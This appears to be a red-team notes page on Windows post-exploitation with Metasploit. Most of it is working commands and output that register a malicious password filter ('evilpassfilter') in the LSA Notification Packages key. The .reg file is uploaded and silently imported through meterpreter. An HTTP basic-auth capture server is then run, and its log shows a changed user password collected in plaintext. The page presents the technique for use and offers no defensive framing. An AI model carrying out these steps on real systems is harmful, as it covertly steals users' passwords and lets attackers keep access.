# Metasploit

## Modify The Registry Entry

Query the notification packages list.

```
meterpreter > reg queryval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v "Notification Packages"
Key: HKLM\System\CurrentcontrolSet\Control\Lsa
Name: Notification Packages
Type:
Data: sceclirassfm
```

 What you can't see here since Metasploit isn't showing the line breaks is that there are two there by default.

```
scecli
rassfm
```

```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]
"Notification Packages"=hex(7):73,00,63,00,65,00,63,00,69,00,72,00,6e,00,\
  00,00,72,00,61,00,73,00,73,00,66,00,6d,00,72,00,6e,00,00,00,65,00,76,00,69,\
  00,6c,00,70,00,61,00,73,00,73,00,66,00,69,00,6c,00,74,00,65,00,72,00,00,00,\
  00,00
```

Upload the registry file then import it.

```
meterpreter > upload grab_credentials.reg .
[*] uploading  : grab_credentials.reg -> .
[*] uploaded   : grab_credentials.reg -> .\grab_credentials.reg
meterpreter > execute -Hf regedit.exe -a "/s grab_credentials.reg"
Process 2628 created.
```

```
meterpreter > reg queryval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v "Notification Packages"
Key: HKLM\System\CurrentcontrolSet\Control\Lsa
Name: Notification Packages
Type:
Data: sceclirnrassfmrnevilpassfilter
```

## Retrieve Credentials

### Web Server

```
msf > use auxiliary/server/capture/http_basic

msf auxiliary(http_basic) > set URIPATH /
URIPATH => /
msf auxiliary(http_basic) > run -j
[*] Auxiliary module execution completed
[*] Listening on 0.0.0.0:80...
[*] Using URL: http://0.0.0.0:80/
[*]  Local IP: http://192.168.92.106:80/
[*] Server started.
msf auxiliary(http_basic) > 
```

 Then we wait for a password to be changed.

```
msf auxiliary(http_basic) > 
[*] 192.168.92.106   http_basic - Sending 401 to client
[+] 192.168.92.106 - Credential collected: "jack:ASDqwe123" => /
```

### SMB Share

TODO: Do a step by step (refer to the backlink to file transfer)

---
## References

### Backlinks

- [[Password Change Notification|Malware Development: Password Change Notification]]

- [[07 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x04 - File Transfer and Data Exfiltration/Windows/Network Ports/SMB/Manual/Server|File Transfer and Data Exfiltration: Windows SMB]]